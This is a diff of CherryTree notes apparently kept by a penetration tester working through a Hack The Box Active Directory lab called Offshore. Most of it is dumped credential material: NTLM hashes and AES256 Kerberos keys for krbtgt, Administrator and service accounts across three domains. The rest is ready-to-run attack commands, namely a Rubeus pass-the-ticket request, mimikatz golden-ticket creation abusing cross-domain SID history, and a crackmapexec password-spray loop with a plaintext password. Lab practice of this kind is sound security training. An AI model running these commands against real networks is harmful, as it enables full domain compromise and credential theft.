+1790	AEaton	49c6543dfbbed0f86449a51962db90be
+1791	WNorth	d6884cc695e41472a1aaa95f9f6869d6
+1792	DSims	13886e3088483faea6e980fc5721866b
+1793	ICoane	4685b7caf90f8f44b793c090b856d0b7
+1794	CParker	0f438480c6c552c73489c4e5165f7a66
+1795	HNewman	f1c39469a92a7628fb2c9c02d70cb204
+1796	MRucker	f6775e0393124d81ecbd37d84debe7d3
+1797	ORamsay	bc97319df7222ebdeb1c25f276affa58
+1798	CBoyle	c1aaf0fb88cc4beb02b2025a1489019b
+1799	RCross	6c4745e0e902f19b8d65859df3b350b8
+1800	DCrawford	6e5476ae318e5117083410e726ebb7f9
+1801	Rwallace	1d863479e1ab3bd62a2bfafa1abaa2dd
+502	krbtgt	cba2ed22077aa56ae957bcf43a8d82f8
+1815	svc_splunk	2f70db5ec87a1afb4d1100e9766812ab
+1818	svc_sccm	5e694c9acbd19f3fed6896073cf32453
+1816	svc_mssql	c1c2432e47927c6e92e4be9804b4cdb5
+1817	svc_commvaultdb	615ef21c4406e9a4ffd5661e9180b4f9
+1111	joe	fde396caf28acc233207b2706483024f
+1810	svc_testldap	4631948d60fe57a27d51dda9ef519b95
+1120	vincent.delpy	f5e7702e1032710f9f16ef8a691da861
+1807	cyberops_svc	45b679ec3f3dcd1b47fbd7fa1ebd847e
+1110	bob	b38c126d0faabc61362ecc83ccb0cd08
+3603	ned_adm	5f3fe41a3d96528a52a8a40d935b1d61
+3609	svc_devops	c718f548c75062ada93250db208d3178
+500	Administrator	0109d7e72fcfe404186c4079ba6cf79c
+3604	ned.flanders_adm	deff72637376f94d8e6c3fab3270f65d
+1603	justalocaladmin	c718f548c75062ada93250db208d3178
+1119	lazy_admin	d168f91992f800743144f24518de5f2b
+1113	bill	47b4d6012d7dcf231d8533758231c80d
+1122	iamtheadministrator	15da52f659978026ba6c3b28663ed959
+1808	WEB-WIN01$	5e294923289f801d7d6abf7fece20472
+3602	MS01$	b0008678126a9a7143961c96161725a4
+5101	svc_opmanager	6bd08e1c070d29efaca47f3d7f816509
+1812	FS01$	64bc93857fbd23f816fa187333b11aa0
+1820	wsadmin	669b12a3bac275251170afbe2c5de8c2
+4102	WSADM$	19f221a69c0693ebfdc064393b55d509
+1813	WS02$	c72e375bed0918ced38b7a8d3e7f5e09
+3608	DEV$	15c85cce3818654479df3d4f5ca6a3d6
+1819	svc_iis	57e1e2964bd92fb501808c45c90d724e
+3611	pgibbons	0694311c666b622f590f1c1837422c5f
+1811	SQL01$	b40dae2bd88b86bf78ea95ba80f95f33
+1114	salvador	7facdc498ed1680c4fd1448319a8c04f
+1804	cyber_adm	7facdc498ed1680c4fd1448319a8c04f
+1000	DC01$	15f2eda7fa69eb8c2eddf511d6e77578</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="DCSync - Other Domains" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571756611.27" ts_lastsave="1571837549.81" unique_id="40">
+				<rich_text>==DEV.ADMIN.OFFSHORE.COM==
+502	krbtgt	9404def404bc198fd9830a3483869e78
+1105	IIS_dev	ce18f9730484ed029749730e2f82b147
+500	Administrator	96fa9583c89ae9713ddeffb6f5f345eb
+1000	DC02$	9d284e5948741cc0dcf5691f71fe02ce
+1104	WS03$	ff96e2b9ac862b196ce3e78c1f9adaa5
+1109	CORP$	8cde9f0c7138d60ddb66b4939ea51a3b
+1103	ADMIN$	5f19127bf15d3fce7865b2969a5cf25f
+
+
+==ADMIN.OFFSHORE.COM==
+502	krbtgt	ea9112d4beb759907688c9e267eff246
+1107	MS01$	db505645b78f70ae01dd6cebbe4b2b8b
+3113	bankvault	0ce1cb01ade331cdba32d0e1fba338a1
+500	Administrator	19a58d8b53e0874a108df36c750efe6f
+1000	DC03$	a309490aabcffeea561fb1d8b36607d0
+1108	WS04$	2abf50d13b5e08b92ac2d90c1d125b99
+3101	DEV$	c28826164b6a29ec5ac985eef42f72af
+3104	CLIENT$	bf13131304ce5144a76f22bc8c53b853</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Kerberos Keys" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571354501.45" ts_lastsave="1571937675.86" unique_id="30">
+				<rich_text>CORP
+
+iamtheadministrator : 1c94844f942dfa4a925919c93a5bcd5f6e107e26e6123ac6a714923230d7817e
+ned_adm : 80105871f4f392529c745eecd885a4690087e78bfbf6528a990ac795028e0956
+Administrator : 4055a87413c357817f7aa03e5713ca9ef30b73f1e52be787aa70022700dd8e56
+krbtgt : c53f6edb9196e9c63e94348a310776e85543fb030216bb751266190e2e3e3bec
+
+DEV
+krbtgt : ff860b4fd2c2f5564510b6859a5a48bfe946f8bec8b09513ad34143e30a11fd7
+
+ADMIN
+krbtgt : 58beeff48c58737dcb85393e250a367a7462c29e80703e035967e686ed9af201
+bankvault : fbceea8b5294797c9f20677957e0ff84b42beb9a978f183b16908c8806def3ed
+Administrator : b94c517e4db5971ac924bf79ca7b20cd3db49a8bd734194cb15d6786316d00e1
+
+Rubues:
+execute-assembly /opt/tools/CSharp_Tools/Rubeus.exe asktgt /user:Administrator  /enctype:AES256 /aes256:b94c517e4db5971ac924bf79ca7b20cd3db49a8bd734194cb15d6786316d00e1 /domain:admin.offshore.com /dc:dc03 /ptt
+
+</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Temp" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1569936039.46" ts_lastsave="1571937371.92" unique_id="20">
+			<rich_text>Userful Commands
+
+for i in $(cat ~/htb/offshore/Internal/enum/crackmap/iplist); do proxychains crackmapexec -u admin -p='Zaq12wsx!' $i; done
+
+
+
+mimikatz kerberos::golden /admin:jason /domain:admin.offshore.com /sid:S-1-5-21-1216317506-3509444512-4230741538 /sids:S-1-5-21-3620216948-299008490-4232453229-519 /krbtgt:ea9112d4beb759907688c9e267eff246 /startoffset:0 /endin:600 /renewmax:10080 /ptt
+
+mimikatz kerberos::golden /admin:jason /domain:dev.admin.offshore.com /sid:S-1-5-21-1416445593-394318334-2645530166 /sids:S-1-5-21-1216317506-3509444512-4230741538-519 /krbtgt:9404def404bc198fd9830a3483869e78 /startoffset:0 /endin:600 /renewmax:10080 /ptt
+
+
+
+
+sidhistory:
+
+powerpick Get-DomainUser -Domain admin.offshore.com
+
+    userprincipalname     : bankvault@ADMIN.OFFSHORE.COM
+    name                  : bankvault
+    sidhistory            : S-1-5-21-524867371-2016665888-3240400722-4109
+    objectsid             : S-1-5-21-1216317506-3509444512-4230741538-3113
+    samaccountname        : bankvault
+
+
+
+
+
+
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Challenges" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1571762802.23" ts_lastsave="1571840915.04" unique_id="41">
+			<rich_text>-   FS01
+   →   Found Capture.pcap file in C:\Users\Joe\Documents
+      ⇒ tcpdump -Ar /home/user/htb/offshore/Downloads/FS01/capture.pcap
+
+-   WS03
+   →   goMonitor program found in C:\Project. File downloaded.
+      ⇒ ~/htb/offshore/Internal/Dev/WS03/goMonitor.zip
+
+-   DC02
+   → C:\users\svc_printjob01\Documents\ecdsa-reuse.zip</rich_text>
+		</node>
 	</node>
 </cherrytree>
